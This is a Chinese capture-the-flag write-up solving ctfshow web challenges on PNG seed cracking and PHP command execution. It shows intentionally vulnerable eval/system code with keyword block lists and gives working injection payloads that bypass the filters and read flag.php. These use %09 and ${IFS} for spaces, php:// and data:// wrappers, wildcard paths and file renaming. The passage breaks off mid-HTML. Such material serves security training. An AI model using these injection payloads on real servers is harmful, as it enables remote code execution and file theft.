<p>从这里我们可以判断出，如果我们输入的r为0，那么$rand为第一个随机数的负数，并且因为非零，在if判断中会在else中输出，因此我们先GET输入?r&#x3D;0，得到第一个随机数的负数。</p>
<p><img src="https://img-blog.csdnimg.cn/20875749074848f196d6b7b1fdc4ef49.png" alt="25"><br>虚拟机打开终端输入ls查看，得到文件php_mt_seed，输入* .&#x2F;php_mt_seed第一个随机数*<br>bp抓包repeater后send为php7.0以上版本<br><img src="https://img-blog.csdnimg.cn/7d7b0b2bcd994279b5a64993de43eb05.png" alt="25"><br>这里有三个（用php7.0版本以上运行代码)</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">mt_srand</span><span class="token punctuation">(</span><span class="token number">3095355977</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>三种可能都试一下，<br><img src="https://img-blog.csdnimg.cn/b91295d5b03f466fa046b44d34f332cd.png" alt="25"><br>通过代码:</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$rand</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
       <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'token'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token punctuation">(</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
           <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>
       <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>令r&#x3D;1374935140可以使得!$rand为真,然后执行if语句，如果cookie传入值正确，得出flag。<br>利用hackbar进行get传参，进行cookie传参得到flag。</p>
<h2 id="命令执行篇"><a href="#命令执行篇" class="headerlink" title="命令执行篇"></a>命令执行篇</h2><h3 id="web31"><a href="#web31" class="headerlink" title="web31"></a>web31</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token comment">/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-04 00:12:34
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-04 00:49:10
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/</span>

<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token variable">$c</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/flag|system|php|cat|sort|shell|\.| |\'/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    
<span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span> </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>其中有一部分：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$c</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/flag|system|php|cat|sort|shell|\.| |\'/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>通过GET传参的方式传入c，传入c的内容中过滤掉了flag system  php cat sort shell 英文句号（.） 空格（ ） 单引号（’）。那么我们可以找一些和他们功能相似的命令。<br>       比如：<br>与**system()<strong>功能相似的命令有</strong>exec()<strong>、</strong>passthru()<strong>、</strong>shell_exec()**。<br>与cat命令功能相似的命令：</p>
<p><em>more:一页一页的显示档案内容<br>less:与 more 类似<br>head:查看头几行<br>tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示<br>tail:查看尾几行<br>nl：显示的时候，顺便输出行号<br>od:以二进制的方式读取档案内容<br>vi:一种编辑器，这个也可以查看<br>vim:一种编辑器，这个也可以查看<br>sort:可以查看<br>uniq:可以查看<br>file -f:报错出具体内容<br>sh &#x2F;flag 2&gt;%261 &#x2F;&#x2F;报错出文件内容</em></p>
<p>空格被过滤掉可以用%09代替。<br>我们get传入**?c&#x3D;passthru(“ls”);**<br><img src="https://img-blog.csdnimg.cn/b63bb7e45461489299cab133c3bc4d75.png" alt="31"><br>然后重新传入**?c&#x3D;passthru(“tac%09fla*”);<em><em>得到flag。<br><strong>还可以：</strong><br>       1 &gt;使用eval嵌套。具体参数：passthru 结合%09<br>其中%09绕过空格 ?c&#x3D;eval($_GET[1]);&amp;1&#x3D;passthru(“tac%09fla</em>“); 这里需要注意括号的闭合，&amp;的连接。<br>       2&gt; 使用pos(localeconv)来获取小数点<br><strong>localeconv</strong>可以返回包括小数点在内的一个数组；</em><em>pos<strong>去取出数组中当前第一个元素，也就是小数点。 <strong>scandir</strong>可以结合它扫描当前目录内容。 <strong>?c&#x3D;print_r(scandir(pos(localeconv())));</strong> 可以看到当前目录下有flag.php 通过</strong>array_reverse<strong>把数组逆序，通过next取到第二个数组元素，也即flag.php 然后</strong>?c&#x3D;show_source(next(array_reverse(scandir(pos(localeconv())))));*</em></p>
<h3 id="web34"><a href="#web34" class="headerlink" title="web34"></a>web34</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token comment">/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-04 00:12:34
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-04 04:21:29
# @email: h1xa@ctfer.com
# @link: https://ctfer.com
*/</span>

<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token variable">$c</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(|\:|\"/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    
<span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span> </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>可以看到，被过滤的更多了</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(|\:|\"/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>用php伪协议:<br>传入**?c&#x3D;include$_GET[a]?&gt;&amp;a&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php**<br>得到一串base64加密过的值:<br><em>PD9waHANCg0KLyoNCiMgLSotIGNvZGluZzogdXRmLTggLSotDQojIEBBdXRob3I6IGgxeGENCiMgQERhdGU6ICAgMjAyMC0wOS0wNCAwMDo0OToxOQ0KIyBATGFzdCBNb2RpZmllZCBieTogICBoMXhhDQojIEBMYXN0IE1vZGlmaWVkIHRpbWU6IDIwMjAtMDktMDQgMDA6NDk6MjYNCiMgQGVtYWlsOiBoMXhhQGN0ZmVyLmNvbQ0KIyBAbGluazogaHR0cHM6Ly9jdGZlci5jb20NCg0KKi8NCg0KJGZsYWc9ImN0ZnNob3d7ODUxZjI3ZjgtNWY5Yy00YTZhLTg5NjctNjIwMzUwNDhmZWMwfSI7DQo&#x3D;</em><br>,然后开始解密得到</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token comment">/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-04 00:49:19
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-04 00:49:26
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/</span>

<span class="token variable">$flag</span><span class="token operator">=</span><span class="token string double-quoted-string">"ctfshow&#123;851f27f8-5f9c-4a6a-8967-62035048fec0&#125;"</span><span class="token punctuation">;</span>
</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="web-39"><a href="#web-39" class="headerlink" title="web 39"></a>web 39</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token comment">//flag in flag.php</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token variable">$c</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/flag/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>   <span class="token comment">//过滤flag</span>
        <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token operator">.</span><span class="token string double-quoted-string">".php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">//添加后缀.php，无回显</span>
    <span class="token punctuation">&#125;</span>
        
<span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span> </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>过滤了flag，采用文件包含的方式，利用data伪协议：传入**?c&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,<?= system("tac fla\g.php");?>**<br>得到flag。</p>
<h3 id="web-40"><a href="#web-40" class="headerlink" title="web 40"></a>web 40</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token variable">$c</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/[0-9]|\~|\`|\@|\#|\\$|\%|\^|\&amp;|\*|\（|\）|\-|\=|\+|\&#123;|\[|\]|\&#125;|\:|\'|\"|\,|\&lt;|\.|\>|\/|\?|\\\\/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
        
<span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span> </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>过滤了冒号，不能用伪协议了，没有过滤英文状态的**()** 和**;**可以试试用无参函数:<br><em><strong>c&#x3D;show_source(next(array_reverse(scandir(pos(localeconv())))));</strong></em></p>
<p><em><strong>c&#x3D;highlight_file(next(array_reverse(scandir(dirname(FILE)))));</strong></em><br><strong>show_source</strong> 与 <strong>highlight_file</strong> 可以互换。<br>得到flag。</p>
<h3 id="web42"><a href="#web42" class="headerlink" title="web42"></a>web42</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
 
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token variable">$c</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token operator">.</span><span class="token string double-quoted-string">" >/dev/null 2>&amp;1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span> </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<blockquote>
<pre><code>&gt;/dev/null 2&gt;&amp;1
&gt;默认情况是1，也就是等同于1&gt;/dev/null 2&gt;&amp;1。意思就是把标准输出重定向到“黑洞”，还把错误输出2重定向到标准输出1，也就是标准输出和错误输出都进了“黑洞”。要想绕过这个“黑洞“，需要往里面传入两个参数，shell会执行第一个参数，将第二个参数带入到黑洞。
</code></pre>
</blockquote>
<p>所以构造 ：<br><code>?c=ls;ls(第二个参数可以写可以不写，但一定要加分号。代表分号前面是第一个参数。)</code><br>接着看到flag.php，然后构造<br><code>?c=tac flag.php;</code><br>得到flag。<br><img src="https://img-blog.csdnimg.cn/2df7d753a2be42d4b6167d2f62e641a9.png" alt="42"><br>关于<strong>linux中&gt;&#x2F;dev&#x2F;null 2&gt;&amp;1和2&gt;&amp;1 &gt; &#x2F;dev&#x2F;null</strong>请<a href="https://www.cnblogs.com/kexianting/p/11630085.html">点击链接</a></p>
<h3 id="web43"><a href="#web43" class="headerlink" title="web43"></a>web43</h3><p>与web42相比，就多过滤了分号和cat。</p>
<blockquote>
<p>分号的代替：<br>%26  	 %0a  	 ||<br>cat的代替就很多了:<br>tac tail nl  sort  uniq	head more less等</p>
</blockquote>
<p>构造：<br><code>?c=tac flag.php%0a</code><br>得到flag。<br><img src="https://img-blog.csdnimg.cn/cd8e9c47e22b4d2186c3b65831fd18ed.png" alt="43"></p>
<h3 id="web44"><a href="#web44" class="headerlink" title="web44"></a>web44</h3><p>构造<code>?c=tac fla\g.php%0a</code><br>flag被过滤，用fla?.php或fla*或fla\g.php<br><img src="https://img-blog.csdnimg.cn/cd533af3fd0546499f6ec5c5ccab36ab.png" alt="44"></p>
<h3 id="web45"><a href="#web45" class="headerlink" title="web45"></a>web45</h3><p>空格被过滤了</p>
<blockquote>
<p>空格的代替：<br>%09<br>%20<br>$IFS<br>${IFS}<br>$IFS$9<br>&lt;<br>&lt;&gt;</p>
</blockquote>
<p>构造：<br><code>?c=tac%09fl\ag.php%26</code><br><img src="https://img-blog.csdnimg.cn/ef07d9f8a7de4bb3a1f66651f7927080.png" alt="45"></p>
<h3 id="web46"><a href="#web46" class="headerlink" title="web46"></a>web46</h3><p>新过滤了*$和数字<br>仍然可以构造<code>?c=tac%09fl\ag.php%26</code>其中%09，%26不受数字被过滤的影响，因为在加载时%09，%26会被解码为空格和分号，也就没有了数字。</p>
<h3 id="web47"><a href="#web47" class="headerlink" title="web47"></a>web47</h3><p>仍然可以构造<code>?c=tac%09fl\ag.php%26</code></p>
<h3 id="web48"><a href="#web48" class="headerlink" title="web48"></a>web48</h3><p>仍然可以构造<code>?c=tac%09fl\ag.php%26</code></p>
<h3 id="web49"><a href="#web49" class="headerlink" title="web49"></a>web49</h3><p>仍然可以构造<code>?c=tac%09fl\ag.php%26</code></p>
<h3 id="web50"><a href="#web50" class="headerlink" title="web50"></a>web50</h3><p>过滤了\x09和\x26，是十六进制，相当于过滤了把%09和%26url解码后的\t和&amp;。<br>那么用nl构造<code>?c=nl&lt;&gt;fl\ag.php%0a</code>查看源码得到flag。<br><img src="https://img-blog.csdnimg.cn/2711a133cca1468d9c6abf47edf4c596.png" alt="50"></p>
<h3 id="web51"><a href="#web51" class="headerlink" title="web51"></a>web51</h3><p>用nl构造<code>?c=nl&lt;&gt;fl\ag.php%0a</code>查看源码得到flag。</p>
<h3 id="web52"><a href="#web52" class="headerlink" title="web52"></a>web52</h3><p>过滤了&lt;&gt;，放开了$。<br>构造<br><img src="https://img-blog.csdnimg.cn/f6af93b9f8184e2fac3ac26887309258.png" alt="51"><br>显示假的flag。<br><img src="https://img-blog.csdnimg.cn/d42ab57d32d045f280099f2d39ade197.png" alt="52"></p>
<p>构造</p>
<p><img src="https://img-blog.csdnimg.cn/5239125221384771978e45ffa48aa32a.png" alt="52"></p>
<p>没有flag。<br>加个反引号构造</p>
<p><img src="https://img-blog.csdnimg.cn/a0f0ec1b687a4c9bb9c58262da2c2893.png" alt="52"><br>假的flag<br><img src="https://img-blog.csdnimg.cn/84c0438b30b645e3b9aa4f2fe6d86feb.png" alt="52"></p>
<p>打开根目录查看：</p>
<p><img src="https://img-blog.csdnimg.cn/544786daf0d548bcb21a19e559b8fff1.png" alt="52"></p>
<p><img src="https://img-blog.csdnimg.cn/7ccadf2e2cdc4d1cad6a66f14f0f46e5.png" alt="52"></p>
<p>等价于<code>?c=ls /;</code>其中“&#x2F;”是根目录。说明flag在根目录下<br>移动flag到吧.txt文件中，构造：<br><img src="https://img-blog.csdnimg.cn/be5efde9753041b7b3e09b29a91ecf29.png" alt="52"><br>查看b.txt<br><img src="https://img-blog.csdnimg.cn/49168164263d4d93a5d74996b5bffe30.png" alt="52"><br>得到flag。<br><img src="https://img-blog.csdnimg.cn/7d1d0459de804272ae8aea67cfe41784.png" alt="52"></p>
<h3 id="web53"><a href="#web53" class="headerlink" title="web53"></a>web53</h3><p>把tac过滤掉了，使用tac时用t\ac不就行了吗？<br>构造：<code>ls%0a</code><br><img src="https://img-blog.csdnimg.cn/c3df993696314026bf5e3f09c92bfed2.png" alt="53"><br>构造：<code>ta\c$&#123;IFS&#125;fl\ag.php%0a</code>得到flag。<br><img src="https://img-blog.csdnimg.cn/83fd360699064877aa18112049e00594.png" alt="53"></p>
<h3 id="web54"><a href="#web54" class="headerlink" title="web54"></a>web54</h3><p>好奇怪</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token variable">$c</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\`|\%|\x09|\x26|\>|\&lt;/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//|.*c.*a.*t.*|的意思是cat 和cat之间插入字符都被过滤了，相当于引号绕过用不了了c""at也会被过滤</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span> </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><code>?c=ls%0a</code>查看一下，<br><img src="https://img-blog.csdnimg.cn/bc99561bcda249aeb4dcd6bfb536e88a.png" alt="54"><br><code>/?c=t&#39;&#39;ac$&#123;IFS&#125;fl??.php%0a</code>无回显。那就将flag.php的名字改一下，<code>?c=mv$&#123;IFS&#125;fla?.php$&#123;IFS&#125;c.txt</code>查看c.txt得到flag。<br><img src="https://img-blog.csdnimg.cn/e0c0b3fb362541a494d84e24c336876c.png" alt="54"></p>
<h3 id="web55"><a href="#web55" class="headerlink" title="web55"></a>web55</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token comment">// 你们在炫技吗？</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token variable">$c</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\;|[a-z]|\`|\%|\x09|\x26|\>|\&lt;/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span> </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这下好了，过滤了字母，但是数字没有过滤，数字？64？用base64加密内容。原内容为<code>/bin/base64 flag.php</code>过滤了字母？用？代替，然后为：<code>/???/????64 ????.???</code><br><img src="https://img-blog.csdnimg.cn/aede99d5d50a4c958806d913e1a910e4.png" alt="55"><br>解密后得到<br><img src="https://img-blog.csdnimg.cn/39f6b55ee217431cb0f50b6b5fab570f.png" alt="55"><br> 知识点：<br> 可以匹配到&#x2F;bin目录下的命令</p>
<blockquote>
<p>cat、cp、chmod df、dmesg、gzip、kill、ls、mkdir、more、mount、rm、su、tar、base64等</p>
</blockquote>
<p> <strong>方法二</strong></p>
<p>参考的wp,有用bzip2的命令的。请参考<a href="https://blog.csdn.net/qq313088385/article/details/114382259">这里</a></p>
<blockquote>
<p> 命令名称：bzip2<br> 命令全称：a block-sorting file compressor<br> 执行权限：所有用户<br> 所在路径：&#x2F;usr&#x2F;bin&#x2F;bzip2<br> 功能描述：压缩文件</p>
</blockquote>
<p>我们可以通过该命令压缩flag.php 然后进行下载<br>payload：?c&#x3D;&#x2F;???&#x2F;???&#x2F;???2 ????.???<br>也就是&#x2F;usr&#x2F;bin&#x2F;bzip2 flag.php<br>然后访问&#x2F;flag.php.bz2进行下载获得flag.php</p>
<p><strong>方法三</strong></p>
<p><a href="https://blog.csdn.net/snowlyzz/article/details/125051503">参考</a></p>
<p>前提是 题目没有过滤 ? &#x2F; . (问号，斜杠,点)，就可以使用这个方法进行<a href="https://so.csdn.net/so/search?q=RCE&spm=1001.2101.3001.7020">RCE</a></p>
<p>编写 本地文件上传的网页：</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
